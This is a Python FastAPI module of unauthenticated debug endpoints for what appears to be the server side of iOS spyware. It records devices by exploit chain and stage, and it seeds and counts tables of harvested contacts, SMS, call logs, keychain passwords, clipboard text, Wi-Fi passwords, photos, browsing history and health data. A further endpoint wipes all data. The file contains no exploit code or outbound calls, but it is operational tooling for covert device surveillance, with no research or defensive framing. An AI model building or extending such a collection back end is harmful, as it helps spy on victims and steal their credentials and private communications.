"""调试 API - 注入测试数据，无需认证"""

from fastapi import APIRouter, Depends, HTTPException, Query
from sqlalchemy.orm import Session
from typing import List, Optional
from datetime import datetime
import hashlib

from database import get_db
import crud, schemas
from models import (
    ContactRecord, SMSRecord, CallRecord, KeychainRecord,
    PhotoRecord, ClipboardRecord, AppRecord, ProcessRecord,
    WiFiRecord, BrowserHistoryRecord, CalendarEvent,
    NoteRecord, HealthRecord, Device, Task
)

router = APIRouter(prefix="/api/debug", tags=["debug"])


def _ensure_device(device_uuid: str, db: Session):
    """如果设备不存在则自动创建"""
    device = crud.get_device(db, device_uuid)
    if not device:
        device = crud.create_device(db, schemas.DeviceRegister(
            device_uuid=device_uuid,
            device_model="iPhone 15 Pro Max (Debug)",
            ios_version="17.0.0",
            chipset="A17 Pro",
            user_agent="Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X)",
            exploit_stage="completed",
            exploit_chain="cassowary -> seedbell -> VariantB",
            runtime_type="PSNMWj",
            has_pac=True,
            pac_integrity=True,
            phone_number="+1-555-0199",
            imei="359876077654321",
            serial_number="F2LK9J7H6P",
            icloud_account="testuser@icloud.com",
            device_name="Debug iPhone",
            locale="zh_CN",
            timezone="Asia/Shanghai",
        ), ip="127.0.0.1")
        db.commit()
    return device


@router.post("/register-device")
def debug_register_device(
    device_uuid: Optional[str] = None,
    db: Session = Depends(get_db)
):
    """注册一个测试设备"""
    if not device_uuid:
        raw = f"debug-{datetime.utcnow().isoformat()}"
        device_uuid = hashlib.md5(raw.encode()).hexdigest()
    _ensure_device(device_uuid, db)
    device = crud.get_device(db, device_uuid)
    return {"ok": True, "device_uuid": device_uuid, "device": device}


@router.post("/inject/{category}")
def debug_inject_data(
    category: str,
    device_uuid: str = Query("debug"),
    count: int = Query(3, ge=1, le=100),
    db: Session = Depends(get_db)
):
    """向指定分类注入测试数据"""
    _ensure_device(device_uuid, db)
    now = datetime.utcnow()
    results = []

    if category == "contacts":
        for i in range(count):
            c = schemas.ContactData(
                device_uuid=device_uuid,
                display_name=f"测试联系人 {i+1}",
                phone_numbers=[{"label": "mobile", "number": f"+86-138-0000-{1000+i}"}],
                emails=[{"label": "work", "email": f"contact{i+1}@test.com"}],
                organization="测试公司",
                notes="调试数据"
            )
            results.append(crud.create_contact(db, c))

    elif category == "sms":
        for i in range(count):
            s = schemas.SMSData(
                device_uuid=device_uuid,
                sender=f"+86-138-0000-{1000+i}",
                recipient="+86-139-0000-0000",
                body=f"这是一条测试短信 #{i+1}，用于调试",
                date_sent=now,
                is_read=True,
                is_sent=True
            )
            results.append(crud.create_sms(db, s))

    elif category == "calls":
        for i in range(count):
            c = schemas.CallData(
                device_uuid=device_uuid,
                phone_number=f"+86-138-0000-{1000+i}",
                call_type="incoming" if i % 2 == 0 else "outgoing",
                duration=60 + i * 30,
                date_called=now
            )
            results.append(crud.create_call(db, c))

    elif category == "keychain":
        entries = [
            ("com.apple.facetime", "appleid@icloud.com", "FaceTime密码123"),
            ("com.apple.account.iCloud", "test@icloud.com", "iCloudP@ss456"),
            ("com.tencent.xin", "wx_user_001", "WeChat_789"),
            ("com.apple.mobilesafari", "saved_password", "SafariP@ss001"),
        ]
        for i in range(min(count, len(entries))):
            svc, acct, pwd = entries[i]
            k = schemas.KeychainData(
                device_uuid=device_uuid,
                service=svc, account=acct, password=pwd,
                label=f"钥匙串条目 {i+1}", accessible="Always"
            )
            results.append(crud.create_keychain(db, k))

    elif category == "clipboard":
        texts = [
            "剪切板测试文本 - 密码: MyP@ss2024!",
            "https://example.com/login?token=eyJhbGciOiJIUzI1NiIs...",
            "信用卡号: 4532-1234-5678-9012",
        ]
        for i in range(min(count, len(texts))):
            cl = ClipboardRecord(
                device_uuid=device_uuid,
                content=texts[i],
                content_type="public.utf8-plain-text",
                app_name="com.apple.mobilesafari"
            )
            db.add(cl)
            results.append(cl)

    elif category == "photos":
        for i in range(count):
            p = schemas.PhotoData(
                device_uuid=device_uuid,
                album_name="相机胶卷",
                file_name=f"IMG_{2024001+i}.JPG",
                file_path=f"/var/mobile/Media/DCIM/100APPLE/IMG_{2024001+i}.JPG",
                file_size=2048576 + i * 1024,
                width=4032, height=3024,
                date_taken=now
            )
            results.append(crud.create_photo(db, p))

    elif category == "apps":
        apps_list = [
            ("com.apple.mobilesafari", "MobileSafari", "Safari浏览器"),
            ("com.tencent.xin", "WeChat", "微信"),
            ("com.apple.mobilemail", "MobileMail", "邮件"),
        ]
        for i in range(min(count, len(apps_list))):
            bid, name, display = apps_list[i]
            a = schemas.AppData(
                device_uuid=device_uuid,
                bundle_id=bid, app_name=name, display_name=display,
                version="17.0.0", app_category="系统应用",
                is_system_app=(i == 0 or i == 2)
            )
            results.append(crud.create_app(db, a))

    elif category == "wifi":
        networks = [
            ("HomeWiFi", "Home", "WPA2", "home12345"),
            ("Office_5G", "Office", "WPA2-Enterprise", "office@2024!"),
            ("iPhone", "iPhone", "WPA2", "personal123"),
        ]
        for i in range(min(count, len(networks))):
            w = schemas.WiFiData(
                device_uuid=device_uuid,
                ssid=networks[i][0], bssid=f"00:11:22:33:44:{55+i}",
                security_type=networks[i][2], password=networks[i][3],
                signal_strength=-40 + i * 10,
                is_saved=True, is_current=(i == 0)
            )
            results.append(crud.create_wifi(db, w))

    elif category == "browser_history":
        urls = [
            ("https://www.baidu.com", "百度一下"),
            ("https://www.qq.com", "腾讯首页"),
            ("https://github.com/login", "GitHub Login"),
        ]
        for i in range(min(count, len(urls))):
            h = schemas.BrowserHistoryData(
                device_uuid=device_uuid,
                browser_name="Safari",
                url=urls[i][0], title=urls[i][1],
                visit_count=5 - i, last_visited=now
            )
            results.append(crud.create_browser_history(db, h))

    elif category == "calendar":
        for i in range(count):
            e = schemas.CalendarEventData(
                device_uuid=device_uuid,
                title=f"测试事件 {i+1}",
                location=f"会议室 {chr(65+i)}",
                start_date=now, end_date=now,
                notes="调试日历事件"
            )
            results.append(crud.create_calendar_event(db, e))

    elif category == "notes":
        for i in range(count):
            n = schemas.NoteData(
                device_uuid=device_uuid,
                title=f"备忘录 #{i+1}",
                content=f"这是第 {i+1} 条测试备忘录的内容\n- 项目1\n- 项目2\n- 项目3",
                folder="测试文件夹"
            )
            results.append(crud.create_note(db, n))

    elif category == "health":
        for i in range(count):
            h = schemas.HealthData(
                device_uuid=device_uuid,
                data_type="HKQuantityTypeIdentifierStepCount",
                value=8000.0 + i * 500.0,
                unit="count", start_date=now, end_date=now,
                source="com.apple.health"
            )
            results.append(crud.create_health_data(db, h))

    elif category == "processes":
        procs = [
            ("powerd", 1, 0, "/usr/libexec/powerd"),
            ("kernel_task", 0, 0, "/kernel"),
            ("SpringBoard", 100, 1, "/System/Library/CoreServices/SpringBoard.app"),
        ]
        for i in range(min(count, len(procs))):
            p = schemas.ProcessData(
                device_uuid=device_uuid,
                name=procs[i][0], pid=procs[i][1], ppid=procs[i][2],
                path=procs[i][3], user="root",
                cpu_usage=2.5 + i * 0.5, memory_usage=65536 + i * 16384,
                status="running"
            )
            results.append(crud.create_process(db, p))

    else:
        raise HTTPException(status_code=400, detail=f"Unknown category: {category}")

    db.commit()
    ids = [r.id for r in results] if hasattr(results[0], 'id') else []
    return {"ok": True, "category": category, "count": len(results), "ids": ids}


@router.post("/inject-all")
def debug_inject_all(
    device_uuid: str = Query("debug"),
    db: Session = Depends(get_db)
):
    """注入所有分类的测试数据"""
    categories = [
        "contacts", "sms", "calls", "keychain", "clipboard",
        "photos", "apps", "wifi", "browser_history", "calendar",
        "notes", "health", "processes"
    ]
    results = {}
    for cat in categories:
        try:
            r = debug_inject_data(cat, device_uuid, 3, db)
            results[cat] = {"ok": True, "count": r["count"]}
        except Exception as e:
            results[cat] = {"ok": False, "error": str(e)}
    return {"ok": True, "device_uuid": device_uuid, "results": results}


@router.get("/stats")
def debug_stats(db: Session = Depends(get_db)):
    """查看数据库统计"""
    total_devices = db.query(Device).count()
    total_tasks = db.query(Task).count()
    counts = {
        "devices": total_devices,
        "tasks": total_tasks,
        "contacts": db.query(ContactRecord).count(),
        "sms": db.query(SMSRecord).count(),
        "calls": db.query(CallRecord).count(),
        "keychains": db.query(KeychainRecord).count(),
        "clipboards": db.query(ClipboardRecord).count(),
        "photos": db.query(PhotoRecord).count(),
        "apps": db.query(AppRecord).count(),
        "processes": db.query(ProcessRecord).count(),
        "wifi": db.query(WiFiRecord).count(),
        "browser_history": db.query(BrowserHistoryRecord).count(),
        "calendar": db.query(CalendarEvent).count(),
        "notes": db.query(NoteRecord).count(),
        "health": db.query(HealthRecord).count(),
    }
    devices = db.query(Device).order_by(Device.last_seen.desc()).limit(10).all()
    return {"counts": counts, "devices": [d.device_uuid for d in devices]}


@router.delete("/clean")
def debug_clean(device_uuid: Optional[str] = Query(None), db: Session = Depends(get_db)):
    """清理测试数据"""
    if device_uuid:
        db.query(ContactRecord).filter(ContactRecord.device_uuid == device_uuid).delete()
        db.query(SMSRecord).filter(SMSRecord.device_uuid == device_uuid).delete()
        db.query(CallRecord).filter(CallRecord.device_uuid == device_uuid).delete()
        db.query(KeychainRecord).filter(KeychainRecord.device_uuid == device_uuid).delete()
        db.query(ClipboardRecord).filter(ClipboardRecord.device_uuid == device_uuid).delete()
        db.query(PhotoRecord).filter(PhotoRecord.device_uuid == device_uuid).delete()
        db.query(AppRecord).filter(AppRecord.device_uuid == device_uuid).delete()
        db.query(ProcessRecord).filter(ProcessRecord.device_uuid == device_uuid).delete()
        db.query(WiFiRecord).filter(WiFiRecord.device_uuid == device_uuid).delete()
        db.query(BrowserHistoryRecord).filter(BrowserHistoryRecord.device_uuid == device_uuid).delete()
        db.query(CalendarEvent).filter(CalendarEvent.device_uuid == device_uuid).delete()
        db.query(NoteRecord).filter(NoteRecord.device_uuid == device_uuid).delete()
        db.query(HealthRecord).filter(HealthRecord.device_uuid == device_uuid).delete()
        db.query(Device).filter(Device.device_uuid == device_uuid).delete()
        db.commit()
        return {"ok": True, "deleted_device": device_uuid}
    else:
        for table in [ContactRecord, SMSRecord, CallRecord, KeychainRecord,
                      ClipboardRecord, PhotoRecord, AppRecord, ProcessRecord,
                      WiFiRecord, BrowserHistoryRecord, CalendarEvent,
                      NoteRecord, HealthRecord, Task, Device]:
            try:
                db.query(table).delete()
            except:
                pass
        db.commit()
        return {"ok": True, "message": "All data cleared"}
